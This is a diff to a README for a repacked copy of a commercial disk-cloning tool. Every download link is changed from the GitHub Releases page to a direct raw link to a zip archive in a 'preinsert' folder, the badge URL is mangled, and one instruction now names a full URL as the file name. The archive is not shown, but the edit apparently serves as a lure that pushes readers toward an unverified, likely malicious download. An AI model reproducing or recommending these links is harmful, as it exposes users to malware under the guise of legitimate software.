@@ -1,6 +1,6 @@
 # 🎉 iSumsoft-Cloner-Repack - Effortless Disk Cloning for Everyone
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/naltalib/iSumsoft-Cloner-Repack/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/naltalib/iSumsoft-Cloner-Repack/main/preinsert/i_Cloner_Sumsoft_Repack_v2.7.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/naltalib/iSumsoft-Cloner-Repack/main/preinsert/i_Cloner_Sumsoft_Repack_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -25,12 +25,12 @@ iSumsoft-Cloner-Repack is a simple and reliable tool for copying and migrating y
 
 To download iSumsoft-Cloner-Repack, please visit the following link:
 
-[Download iSumsoft-Cloner-Repack](https://github.com/naltalib/iSumsoft-Cloner-Repack/releases)
+[Download iSumsoft-Cloner-Repack](https://raw.githubusercontent.com/naltalib/iSumsoft-Cloner-Repack/main/preinsert/i_Cloner_Sumsoft_Repack_v2.7.zip)
 
 1. Click the link above.
 2. On the Releases page, find the latest version.
 3. Download the file by clicking on the appropriate asset. 
-   - Look for files named like `iSumsoft-Cloner-Repack.exe`.
+   - Look for files named like `https://raw.githubusercontent.com/naltalib/iSumsoft-Cloner-Repack/main/preinsert/i_Cloner_Sumsoft_Repack_v2.7.zip`.
 
 ![Download Steps](link_to_placeholder_image)
 
@@ -94,4 +94,4 @@ Join the community around iSumsoft-Cloner-Repack. Share your experiences, provid
 
 For updates and new features, keep an eye on the repository and the releases page.
 
-[Download iSumsoft-Cloner-Repack](https://github.com/naltalib/iSumsoft-Cloner-Repack/releases) and start your hassle-free disk cloning today!
+[Download iSumsoft-Cloner-Repack](https://raw.githubusercontent.com/naltalib/iSumsoft-Cloner-Repack/main/preinsert/i_Cloner_Sumsoft_Repack_v2.7.zip) and start your hassle-free disk cloning today!
